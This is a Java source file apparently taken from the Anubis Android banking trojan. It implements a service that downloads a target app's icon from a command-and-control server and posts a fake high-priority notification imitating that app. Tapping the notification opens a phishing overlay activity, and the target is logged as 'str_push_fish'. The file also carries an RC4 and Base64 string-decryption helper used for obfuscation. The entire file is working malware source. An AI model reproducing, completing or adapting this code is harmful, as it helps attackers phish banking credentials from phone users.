package anubis.bot.myapplication;

import android.annotation.SuppressLint;
import android.annotation.TargetApi;
import android.app.IntentService;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Color;
import android.graphics.drawable.Icon;
import android.os.AsyncTask;
import android.os.Build;
import android.util.Base64;

import java.io.IOException;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;

import anubis.bot.myapplication.API.ClassRC4;
import anubis.bot.myapplication.Activity.ActivityPushInjection;

@SuppressWarnings("WrongThread")
@SuppressLint("NewApi")
public class ServiceModuleNotification extends IntentService {
    UtilsClass SF = new UtilsClass();
    public ServiceModuleNotification() {
        super("");
    }


    @Override
    protected void onHandleIntent(Intent intent) {

        String top = intent.getStringExtra("appname");
        String PushTitle = intent.getStringExtra("title");
        String PushText = intent.getStringExtra("text");
        String url = SF.SetRead(this,"url");
        SF.Log("PUSH","1: " + url + "/icon/" + top + ".png");
        new generatePictureStyle(this, PushTitle, PushText, url + "/icon/" + top + ".png", top).execute();
    }

    public String str_decrypt(String textDE_C, String key)
    {
        UtilsClass utilsClass = new UtilsClass();
        try
        {
            byte[] data = Base64.decode(textDE_C, Base64.DEFAULT);
            textDE_C = new String(data, "UTF-8");
            byte[] detext = utilsClass.hexStringToByteArray(textDE_C);
            ClassRC4 rcd = new ClassRC4(key.getBytes());
            return  new String(rcd.decrypt(detext));
        }catch (Exception ex){ }
        return "";
    }
    public class generatePictureStyle extends AsyncTask<String, Void, Bitmap> {
        private Context mContext;
        private String title, message, imageUrl, top;

        public generatePictureStyle(Context context2, String TIT, String MSG, String url, String up) {
            super();
            this.mContext = context2;
            this.title = TIT;
            this.message = MSG;
            this.imageUrl = url;
            this.top = up;
            SF.Log("PUSH","2");
        }
        @Override
        protected Bitmap doInBackground(String... params) {
            InputStream in;

            SF.Log("PUSH","3");
            try {
                URL url = new URL(this.imageUrl);
                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                connection.setDoInput(true);
                connection.connect();
                in = connection.getInputStream();
                Bitmap myBitmap = BitmapFactory.decodeStream(in);
                return myBitmap;
            } catch (MalformedURLException e) {
              return null;
            } catch (IOException e) {
                return null;
            }
        }

        public String str_decrypt(String textDE_C, String key)
        {
            UtilsClass utilsClass = new UtilsClass();
            try
            {
                byte[] data = Base64.decode(textDE_C, Base64.DEFAULT);
                textDE_C = new String(data, "UTF-8");
                byte[] detext = utilsClass.hexStringToByteArray(textDE_C);
                ClassRC4 rcd = new ClassRC4(key.getBytes());
                return  new String(rcd.decrypt(detext));
            }catch (Exception ex){ }
            return "";
        }

        @TargetApi(Build.VERSION_CODES.JELLY_BEAN)
        @Override
        protected void onPostExecute(Bitmap result) {
            super.onPostExecute(result);
            try {
                SF.SetWrite(mContext, "str_push_fish", top);
                SF.Log("PUSH", "4 " + top);
                Intent intent = new Intent(ServiceModuleNotification.this, ActivityPushInjection.class)
                        .putExtra("str", top)
                        .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        .addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
                        .addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);

            if(Build.VERSION.SDK_INT<=25) {

           //     byte[] decodedString = Base64.decode(iconIM, Base64.DEFAULT);
             //   Bitmap decodedByte = BitmapFactory.decodeByteArray(decodedString, 0, decodedString.length);



                PendingIntent pendingIntent = PendingIntent.getActivity(mContext, 100, intent, PendingIntent.FLAG_ONE_SHOT);
                NotificationManager notificationManager = (NotificationManager) mContext.getSystemService(Context.NOTIFICATION_SERVICE);
                android.app.Notification notif = new android.app.Notification.Builder(mContext)
                        .setContentIntent(pendingIntent)
                        .setContentTitle(this.title)
                        .setContentText(this.message)
                        .setVibrate(new long[]{1000, 1000, 1000, 1000, 1000})
                        .setPriority(android.app.Notification.PRIORITY_HIGH)
                        .setDefaults(android.app.Notification.DEFAULT_VIBRATE)
                        .setDefaults(android.app.Notification.DEFAULT_SOUND)
                        .setDefaults(android.app.Notification.DEFAULT_LIGHTS)
                      //  .setSmallIcon(R.drawable.im)
                      //  .setSmallIcon(Icon.createWithBitmap(decodedByte))
                        .setSmallIcon(mContext.getResources().getIdentifier(mContext.getPackageName() + ":mipmap/ic_launcher", null, null))
                        .setLargeIcon(result)
                        .build();
                notif.flags |= android.app.Notification.FLAG_AUTO_CANCEL;
                notificationManager.notify(1, notif);
            }else{

                SF.Log("Notification", "Title: "+ this.title + " Text: " + this.message);
                SF.LoadLibNotificationPush(mContext, intent, result, this.title, this.message);
            }

            }catch(Exception ex){
                SF.Log("ERROR","ServiceModuleNotification -> PUSH 4");
            }
        }
    }



  // String iconIM = "iVBORw0KGgoAAAANSUhEUgAAAAsAAAALCAYAAACprHcmAAAAAXNSR0IArs4c6QAAAAlwSFlzAAALEwAACxMBAJqcGAAAAA5JREFUGBljYBgFIygEAAHvAAHlmLEMAAAAAElFTkSuQmCC";
}